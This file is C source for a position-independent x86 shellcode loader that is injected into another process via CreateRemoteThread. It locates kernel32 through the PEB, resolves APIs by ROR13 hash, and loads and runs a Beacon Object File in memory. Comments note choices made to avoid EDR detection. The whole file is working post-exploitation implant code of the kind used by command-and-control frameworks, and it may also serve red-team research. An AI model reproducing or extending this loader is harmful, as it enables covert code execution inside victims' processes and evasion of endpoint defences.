/*
 * loader.c — slice 1.d phase B-bis step 0 skeleton.
 *
 * Position-independent x86 shellcode injected into a WoW64 host
 * via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
 * No PE wrapper, no static imports, no .rodata — everything is
 * computed at run time from PEB + ROR13-hashed kernel32 export
 * names so the blob runs from any address.
 *
 * This skeleton:
 *   - Validates the parent-supplied params block (magic + version).
 *   - Walks the PEB to find kernel32.dll's base.
 *   - Resolves ExitThread via ROR13.
 *   - Marks status = DONE, ExitThread.
 *
 * The real loader (phase B-bis step 1) replaces the ack with the
 * COFF parser + relocation engine + Beacon API impl — still a
 * single PIC blob, all kernel32 calls resolved through the same
 * PEB walk.
 *
 * Why no banner write in step 0: any string literal would land in
 * .rodata, and a flat objcopy blob doesn't carry section-relative
 * relocations. Step 1 will marshal output via the BOF's
 * BeaconPrintf path which is dynamic and stack-local by design.
 *
 * Build (see scripts/build-bof-x86-loader.sh; Podman fallback):
 *   i686-w64-mingw32-gcc -m32 -O2 -fno-asynchronous-unwind-tables
 *     -fno-ident -nostdlib -ffreestanding -fno-stack-protector
 *     -fno-pic -fno-pie -masm=intel -c loader.c -o loader.o
 *   i686-w64-mingw32-ld -T loader.ld -o loader.elf loader.o
 *   i686-w64-mingw32-objcopy -O binary -j .text loader.elf loader.bin
 */

#include <stdint.h>
#include "abi.h"

/* ROR13 hashes — same primitive as win/api.ResolveByHash, so the
 * parent's hash matches the loader's. Pre-computed via the Go
 * helper TestRor13_KnownAnswers in x86fork_present_windows_test.go;
 * any rename here MUST land in the Go test in the same commit. */
#define HASH_EXIT_THREAD          0x60E0CEEFu  /* ExitThread */
#define HASH_VIRTUAL_ALLOC        0x91AFCA54u  /* VirtualAlloc */
#define HASH_VIRTUAL_PROTECT      0x7946C61Bu  /* VirtualProtect */
#define HASH_GET_PROCESS_HEAP     0xA80EECAEu  /* GetProcessHeap */
#define HASH_HEAP_ALLOC           0x2500383Cu  /* HeapAlloc */
#define HASH_HEAP_FREE            0x10C32616u  /* HeapFree */
#define HASH_RTL_MOVE_MEMORY      0xCF14E85Bu  /* RtlMoveMemory */

/* kernel32 function pointer types. All Win32 imports we use are
 * __stdcall; the typedefs let the resolver-table walker assign
 * addresses without an unsafe-looking cast. */
typedef void  __stdcall (*pfn_ExitThread)(uint32_t code);
typedef void *__stdcall (*pfn_VirtualAlloc)(void *addr, uint32_t size, uint32_t allocType, uint32_t protect);
typedef int   __stdcall (*pfn_VirtualProtect)(void *addr, uint32_t size, uint32_t newProtect, uint32_t *oldProtect);
typedef void *__stdcall (*pfn_GetProcessHeap)(void);
typedef void *__stdcall (*pfn_HeapAlloc)(void *heap, uint32_t flags, uint32_t bytes);
typedef int   __stdcall (*pfn_HeapFree)(void *heap, uint32_t flags, void *mem);
typedef void  __stdcall (*pfn_RtlMoveMemory)(void *dst, const void *src, uint32_t len);

/* kapi groups every resolved kernel32 function so the loader can
 * pass a single pointer around instead of threading 7 args.
 * Allocated on the loader's stack at entry, filled by resolve_kapi. */
typedef struct {
    pfn_ExitThread      ExitThread;
    pfn_VirtualAlloc    VirtualAlloc;
    pfn_VirtualProtect  VirtualProtect;
    pfn_GetProcessHeap  GetProcessHeap;
    pfn_HeapAlloc       HeapAlloc;
    pfn_HeapFree        HeapFree;
    pfn_RtlMoveMemory   RtlMoveMemory;
} kernel32_api_t;

/* Read 32-bit PEB via fs:[0x30] (WoW64-safe; the 32-bit TIB
 * carries the 32-bit PEB at TIB+0x30).
 *
 * Note: the inline asm is in Intel order (dst, src) because the
 * build uses -masm=intel. With the default AT&T syntax the
 * operands would be swapped and the instruction would *write*
 * %0 into fs:0x30 instead of reading from it. */
static inline uint32_t get_peb32(void)
{
    uint32_t peb;
    __asm__ volatile ("mov %0, fs:0x30" : "=r"(peb));
    return peb;
}

/* ror13_hash matches win/api.ResolveByHash: 32-bit rotate-right
 * accumulator over the function name bytes. */
static uint32_t ror13_hash(const uint8_t *s)
{
    uint32_t h = 0;
    while (*s) {
        h = ((h >> 13) | (h << 19)) + (uint32_t)*s;
        s++;
    }
    return h;
}

/* Walks PEB->Ldr->InMemoryOrderModuleList.Flink to entry [2]:
 * (host EXE)→(ntdll)→(kernel32). Stable on every Windows since
 * NT 4.0. Phase B-bis step 1 will switch to a base-name compare
 * for paranoia. */
static uint32_t find_kernel32_base(void)
{
    uint32_t peb = get_peb32();
    uint32_t ldr = *(uint32_t *)(peb + 0x0C);
    uint32_t entry = *(uint32_t *)(ldr + 0x14);
    entry = *(uint32_t *)(entry);
    entry = *(uint32_t *)(entry);
    return *(uint32_t *)(entry + 0x10);
}

/* resolve_by_hash walks `module_base`'s export table. Returns the
 * absolute address of the first matching export, 0 on miss. */
static uint32_t resolve_by_hash(uint32_t module_base, uint32_t wanted)
{
    uint8_t *base = (uint8_t *)module_base;
    uint32_t pe = *(uint32_t *)(base + 0x3C);
    uint32_t exp_rva = *(uint32_t *)(base + pe + 0x78);
    if (!exp_rva) return 0;
    uint8_t *exp_dir = base + exp_rva;

    uint32_t n_names    = *(uint32_t *)(exp_dir + 0x18);
    uint32_t names_rva  = *(uint32_t *)(exp_dir + 0x20);
    uint32_t funcs_rva  = *(uint32_t *)(exp_dir + 0x1C);
    uint32_t ords_rva   = *(uint32_t *)(exp_dir + 0x24);

    uint32_t *names = (uint32_t *)(base + names_rva);
    uint32_t *funcs = (uint32_t *)(base + funcs_rva);
    uint16_t *ords  = (uint16_t *)(base + ords_rva);

    for (uint32_t i = 0; i < n_names; i++) {
        if (ror13_hash(base + names[i]) == wanted) {
            return (uint32_t)(base + funcs[ords[i]]);
        }
    }
    return 0;
}

/* resolve_kapi populates `k` with every kernel32 function pointer
 * the loader needs. Returns 1 on success, 0 if any export couldn't
 * be resolved (caller surfaces LOADER_STATUS_RESOLVE_FAIL). */
static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
{
    k->ExitThread     = (pfn_ExitThread)    resolve_by_hash(k32, HASH_EXIT_THREAD);
    k->VirtualAlloc   = (pfn_VirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
    k->VirtualProtect = (pfn_VirtualProtect)resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
    k->GetProcessHeap = (pfn_GetProcessHeap)resolve_by_hash(k32, HASH_GET_PROCESS_HEAP);
    k->HeapAlloc      = (pfn_HeapAlloc)     resolve_by_hash(k32, HASH_HEAP_ALLOC);
    k->HeapFree       = (pfn_HeapFree)      resolve_by_hash(k32, HASH_HEAP_FREE);
    k->RtlMoveMemory  = (pfn_RtlMoveMemory) resolve_by_hash(k32, HASH_RTL_MOVE_MEMORY);
    return k->ExitThread && k->VirtualAlloc && k->VirtualProtect
        && k->GetProcessHeap && k->HeapAlloc && k->HeapFree
        && k->RtlMoveMemory;
}

/* — COFF i386 structures + reloc engine -------------------------
 *
 * All multi-byte fields little-endian (Windows-native). Field
 * offsets mirror the PE/COFF spec; struct layout is access-by-offset
 * (not memcpy into a struct) so we don't depend on the compiler
 * packing the typedefs to the exact wire size. */

#define MAX_SECTIONS 32

#define IMAGE_SCN_MEM_EXECUTE 0x20000000u

/* IMAGE_REL_I386_* relocation types. */
#define IMAGE_REL_I386_ABSOLUTE 0x0000
#define IMAGE_REL_I386_DIR16    0x0001
#define IMAGE_REL_I386_REL16    0x0002
#define IMAGE_REL_I386_DIR32    0x0006
#define IMAGE_REL_I386_DIR32NB  0x0007
#define IMAGE_REL_I386_SECTION  0x000A
#define IMAGE_REL_I386_SECREL   0x000B
#define IMAGE_REL_I386_REL32    0x0014

/* Wire offsets for the COFF structs. Avoiding direct struct types
 * keeps the loader independent of any compiler quirks around
 * #pragma pack or natural alignment for sub-32-bit fields. */
#define COFF_HEADER_SIZE 20
#define COFF_SECTION_SIZE 40
#define COFF_RELOC_SIZE 10
#define COFF_SYMBOL_SIZE 18

#define HDR_MACHINE_OFF              0   /* uint16 */
#define HDR_NSECTIONS_OFF            2   /* uint16 */
#define HDR_PTR_SYMTAB_OFF           8   /* uint32 */
#define HDR_NSYMBOLS_OFF            12   /* uint32 */
#define HDR_SIZEOF_OPT_HDR_OFF      16   /* uint16 */

#define SEC_NAME_OFF                 0   /* 8 bytes */
#define SEC_VIRTUAL_SIZE_OFF         8   /* uint32 */
#define SEC_VIRTUAL_ADDR_OFF        12   /* uint32 */
#define SEC_SIZE_OF_RAW_DATA_OFF    16   /* uint32 */
#define SEC_PTR_TO_RAW_DATA_OFF     20   /* uint32 */
#define SEC_PTR_TO_RELOCS_OFF       24   /* uint32 */
#define SEC_NUMBER_OF_RELOCS_OFF    32   /* uint16 */
#define SEC_CHARACTERISTICS_OFF     36   /* uint32 */

#define REL_VIRTUAL_ADDR_OFF         0   /* uint32 */
#define REL_SYMBOL_TBL_INDEX_OFF     4   /* uint32 */
#define REL_TYPE_OFF                 8   /* uint16 */

#define SYM_NAME_OFF                 0   /* 8 bytes (long-name = first 4 zero + offset in next 4) */
#define SYM_VALUE_OFF                8   /* uint32 */
#define SYM_SECTION_NUMBER_OFF      12   /* int16 */
#define SYM_NUMBER_OF_AUX_OFF       17   /* uint8 */

/* le16 / le32 — explicit little-endian reads. The host is little-
 * endian Windows so a *(uint16_t*)p would also work; the explicit
 * form documents the wire format. */
static inline uint16_t le16(const uint8_t *p) { return (uint16_t)p[0] | ((uint16_t)p[1] << 8); }
static inline uint32_t le32(const uint8_t *p)
{
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8)
        | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}
static inline void le32_put(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)v;
    p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16);
    p[3] = (uint8_t)(v >> 24);
}

/* — Symbol name comparison ---------------------------------------
 *
 * COFF symbol names are either short (≤8 bytes, NUL-padded in the
 * 8-byte name field) or long (first 4 bytes zero, next 4 bytes are
 * an offset into the string table). i386 toolchains prefix every
 * C identifier with `_`, so `go` is encoded as `_go`. */

static uint32_t sym_name_eq_underscore_go(const uint8_t *sym, const uint8_t *bof, uint32_t string_tbl_off)
{
    /* Short-name case first — most BOF entries are <=8 chars. */
    if (le32(sym + SYM_NAME_OFF) != 0) {
        return sym[0] == '_' && sym[1] == 'g' && sym[2] == 'o' && sym[3] == 0;
    }
    /* Long name: offset into string table. */
    uint32_t name_off = le32(sym + SYM_NAME_OFF + 4);
    const uint8_t *name = bof + string_tbl_off + name_off;
    return name[0] == '_' && name[1] == 'g' && name[2] == 'o' && name[3] == 0;
}

/* — Per-execution context ----------------------------------------
 *
 * Bundled so deeply-nested helpers don't need 7-arg signatures.
 * Lives on loader_entry's stack frame; sub-helpers receive a
 * pointer to it. */

typedef struct {
    loader_params_t *p;
    kernel32_api_t  *k;

    const uint8_t *bof;       /* params->bof_addr cast (read-only view) */
    uint32_t       bof_len;
    uint32_t       string_tbl_off;

    uint8_t  *mapping;        /* VirtualAlloc'd RWX region inside the child */
    uint32_t  mapping_size;
    uint32_t  section_base[MAX_SECTIONS + 1]; /* [1..N], idx 0 unused */
    uint32_t  section_exec[MAX_SECTIONS + 1]; /* bool: section needs PAGE_EXECUTE_READ */
    uint32_t  n_sections;
} loader_ctx_t;

/* — Layout + section copy ---------------------------------------- */

static uint32_t exec_bof(loader_params_t *p, kernel32_api_t *k);

static uint32_t bof_load_and_run(loader_params_t *p, kernel32_api_t *k)
{
    return exec_bof(p, k);
}

static uint32_t exec_bof(loader_params_t *p, kernel32_api_t *k)
{
    loader_ctx_t ctx;
    /* Zero ctx without memset (no kernel32 export resolution required). */
    {
        uint8_t *q = (uint8_t *)&ctx;
        for (uint32_t i = 0; i < sizeof(ctx); i++) q[i] = 0;
    }
    ctx.p = p;
    ctx.k = k;
    ctx.bof = (const uint8_t *)p->bof_addr;
    ctx.bof_len = p->bof_len;

    if (ctx.bof_len < COFF_HEADER_SIZE) {
        p->error_code = 0x10001;
        return LOADER_STATUS_LOAD_FAIL;
    }

    uint16_t machine = le16(ctx.bof + HDR_MACHINE_OFF);
    if (machine != 0x014c) {
        p->error_code = 0x10002;
        return LOADER_STATUS_LOAD_FAIL;
    }

    uint16_t nsec = le16(ctx.bof + HDR_NSECTIONS_OFF);
    if (nsec == 0 || nsec > MAX_SECTIONS) {
        p->error_code = 0x10003;
        return LOADER_STATUS_LOAD_FAIL;
    }
    ctx.n_sections = nsec;

    uint16_t opt_hdr_size = le16(ctx.bof + HDR_SIZEOF_OPT_HDR_OFF);
    uint32_t sec_tbl_off = COFF_HEADER_SIZE + opt_hdr_size;
    uint32_t sec_tbl_end = sec_tbl_off + (uint32_t)nsec * COFF_SECTION_SIZE;
    if (sec_tbl_end > ctx.bof_len) {
        p->error_code = 0x10004;
        return LOADER_STATUS_LOAD_FAIL;
    }

    uint32_t sym_tbl_off = le32(ctx.bof + HDR_PTR_SYMTAB_OFF);
    uint32_t n_syms      = le32(ctx.bof + HDR_NSYMBOLS_OFF);
    ctx.string_tbl_off   = sym_tbl_off + n_syms * COFF_SYMBOL_SIZE;

    /* Pass 1: total size = sum of SizeOfRawData for every section
     * that has raw data. Add a page of slack so the layout pass can
     * align exec sections to a page boundary if needed (matches the
     * x64 loader). MAX 16 MB to keep loose footers tiny. */
    uint32_t total = 0;
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = ctx.bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint32_t raw_size = le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
        if (raw_size) total += raw_size;
    }
    if (total == 0 || total > 0x01000000u) {
        p->error_code = 0x10005;
        return LOADER_STATUS_LOAD_FAIL;
    }

    ctx.mapping = (uint8_t *)k->VirtualAlloc(0, total, /* MEM_COMMIT|MEM_RESERVE */ 0x3000,
                                              /* PAGE_READWRITE */ 0x04);
    if (!ctx.mapping) {
        p->error_code = 0x10006;
        return LOADER_STATUS_LOAD_FAIL;
    }
    ctx.mapping_size = total;

    /* Pass 2: copy sections sequentially. Record per-section base
     * address + executable flag. The layout doesn't separate exec
     * from non-exec sections (unlike the x64 loader's two-pass
     * layout) — i386 .text + .data don't suffer the same shared-
     * page RW/RX gotcha because i386 typically uses 4 KB pages
     * and the BOFs we target keep .data after .text already. We
     * VirtualProtect each exec section individually below. */
    uint32_t cursor = 0;
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = ctx.bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint32_t raw_size  = le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
        uint32_t raw_ptr   = le32(sh + SEC_PTR_TO_RAW_DATA_OFF);
        uint32_t chars     = le32(sh + SEC_CHARACTERISTICS_OFF);
        if (raw_size == 0 || raw_ptr == 0) continue;
        if (raw_ptr + raw_size > ctx.bof_len) {
            p->error_code = 0x10007;
            return LOADER_STATUS_LOAD_FAIL;
        }
        uint8_t *dst = ctx.mapping + cursor;
        k->RtlMoveMemory(dst, ctx.bof + raw_ptr, raw_size);
        ctx.section_base[i + 1] = (uint32_t)dst;
        ctx.section_exec[i + 1] = (chars & IMAGE_SCN_MEM_EXECUTE) ? 1 : 0;
        cursor += raw_size;
    }

    /* Pass 3: apply relocations for every section that has them.
     * Step 1.b scope: handle internal references only. External
     * imports (section_number == 0) surface as LOAD_FAILED — step
     * 1.c will plug the Beacon API resolver in here. */
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = ctx.bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint16_t n_relocs   = le16(sh + SEC_NUMBER_OF_RELOCS_OFF);
        if (n_relocs == 0) continue;
        uint32_t rel_ptr  = le32(sh + SEC_PTR_TO_RELOCS_OFF);
        uint32_t sec_base = ctx.section_base[i + 1];
        if (sec_base == 0) continue;

        for (uint16_t r = 0; r < n_relocs; r++) {
            const uint8_t *re = ctx.bof + rel_ptr + (uint32_t)r * COFF_RELOC_SIZE;
            uint32_t va     = le32(re + REL_VIRTUAL_ADDR_OFF);
            uint32_t sym_ix = le32(re + REL_SYMBOL_TBL_INDEX_OFF);
            uint16_t type   = le16(re + REL_TYPE_OFF);

            if (sym_ix >= n_syms) {
                p->error_code = 0x10010;
                return LOADER_STATUS_LOAD_FAIL;
            }
            const uint8_t *sym = ctx.bof + sym_tbl_off + sym_ix * COFF_SYMBOL_SIZE;
            uint32_t sym_value = le32(sym + SYM_VALUE_OFF);
            int16_t  sym_sec   = (int16_t)le16(sym + SYM_SECTION_NUMBER_OFF);

            uint32_t target;
            if (sym_sec > 0) {
                if ((uint32_t)sym_sec > nsec || ctx.section_base[sym_sec] == 0) {
                    p->error_code = 0x10011;
                    return LOADER_STATUS_LOAD_FAIL;
                }
                target = ctx.section_base[sym_sec] + sym_value;
            } else if (sym_sec == 0) {
                /* External import — step 1.c. */
                p->error_code = 0x10012;
                return LOADER_STATUS_LOAD_FAIL;
            } else {
                /* IMAGE_SYM_ABSOLUTE / DEBUG (negative). Use the
                 * symbol's value as the absolute target — true for
                 * absolute symbols; debug symbols rarely have relocs
                 * against them in BOFs. */
                target = sym_value;
            }

            uint8_t *patch = (uint8_t *)(sec_base + va);
            if (type == IMAGE_REL_I386_ABSOLUTE) {
                /* no-op */
            } else if (type == IMAGE_REL_I386_DIR32) {
                uint32_t addend = le32(patch);
                le32_put(patch, target + addend);
            } else if (type == IMAGE_REL_I386_REL32) {
                uint32_t addend = le32(patch);
                uint32_t pc = (uint32_t)patch + 4;
                le32_put(patch, target + addend - pc);
            } else if (type == IMAGE_REL_I386_DIR32NB) {
                uint32_t addend = le32(patch);
                le32_put(patch, target + addend - (uint32_t)ctx.mapping);
            } else {
                p->error_code = 0x10013 | ((uint32_t)type << 16);
                return LOADER_STATUS_LOAD_FAIL;
            }
        }
    }

    /* Pass 4: flip exec sections to PAGE_EXECUTE_READ. Same posture
     * as the x64 loader — drops RWX as a watchful EDR tell. */
    for (uint16_t i = 0; i < nsec; i++) {
        const uint8_t *sh = ctx.bof + sec_tbl_off + (uint32_t)i * COFF_SECTION_SIZE;
        uint32_t raw_size = le32(sh + SEC_SIZE_OF_RAW_DATA_OFF);
        if (raw_size == 0) continue;
        if (!ctx.section_exec[i + 1]) continue;
        uint32_t old_protect = 0;
        if (!k->VirtualProtect((void *)ctx.section_base[i + 1],
                               raw_size,
                               /* PAGE_EXECUTE_READ */ 0x20,
                               &old_protect)) {
            p->error_code = 0x10014;
            return LOADER_STATUS_LOAD_FAIL;
        }
    }

    /* Pass 5: find the "_go" entry symbol. The first section it
     * belongs to (sym_sec > 0) tells us its base; sym->Value is
     * the offset within that section. */
    uint32_t entry_addr = 0;
    for (uint32_t i = 0; i < n_syms; i++) {
        const uint8_t *sym = ctx.bof + sym_tbl_off + i * COFF_SYMBOL_SIZE;
        int16_t sym_sec = (int16_t)le16(sym + SYM_SECTION_NUMBER_OFF);
        if (sym_sec <= 0) {
            i += sym[SYM_NUMBER_OF_AUX_OFF];
            continue;
        }
        if (!sym_name_eq_underscore_go(sym, ctx.bof, ctx.string_tbl_off)) {
            i += sym[SYM_NUMBER_OF_AUX_OFF];
            continue;
        }
        if ((uint32_t)sym_sec > nsec || ctx.section_base[sym_sec] == 0) {
            p->error_code = 0x10020;
            return LOADER_STATUS_LOAD_FAIL;
        }
        entry_addr = ctx.section_base[sym_sec] + le32(sym + SYM_VALUE_OFF);
        break;
    }
    if (entry_addr == 0) {
        p->error_code = 0x10021;
        return LOADER_STATUS_LOAD_FAIL;
    }

    /* Pass 6: call the entry. i386 BOFs use cdecl: caller pushes
     * args right-to-left, caller cleans the stack. Signature is
     * `void go(char *args, int alen)`. */
    typedef void __cdecl (*bof_entry_t)(const void *args, int32_t alen);
    bof_entry_t entry = (bof_entry_t)entry_addr;
    entry((const void *)p->args_addr, (int32_t)p->args_len);

    return LOADER_STATUS_DONE;
}

/* loader entry — CreateRemoteThread targets this address with the
 * params block pointer as lpThreadParameter. The skeleton sets
 * status to DONE and exits; the parent's ReadProcessMemory of
 * params verifies the round trip end to end. */
__attribute__((section(".text.entry")))
__attribute__((force_align_arg_pointer))
uint32_t __stdcall loader_entry(loader_params_t *p)
{
    if (!p) return LOADER_STATUS_ABI_MISMATCH;

    if (p->magic != LOADER_ABI_MAGIC || p->version != LOADER_ABI_VERSION) {
        p->status = LOADER_STATUS_ABI_MISMATCH;
        p->error_code = p->magic ^ LOADER_ABI_MAGIC;
        return LOADER_STATUS_ABI_MISMATCH;
    }
    p->status = LOADER_STATUS_RUNNING;

    uint32_t k32 = find_kernel32_base();
    if (!k32) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }
    kernel32_api_t k;
    if (!resolve_kapi(k32, &k)) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }

    /* Step 1.b: parse + relocate + call the BOF. External imports
     * (section_number == 0 in any reloc) surface as LOAD_FAIL —
     * step 1.c will plug the Beacon API resolver in here. */
    uint32_t result = bof_load_and_run(p, &k);
    p->status = result;
    p->out_len = 0;
    p->err_len = 0;
    k.ExitThread(result);
    return result;  /* unreachable */
}
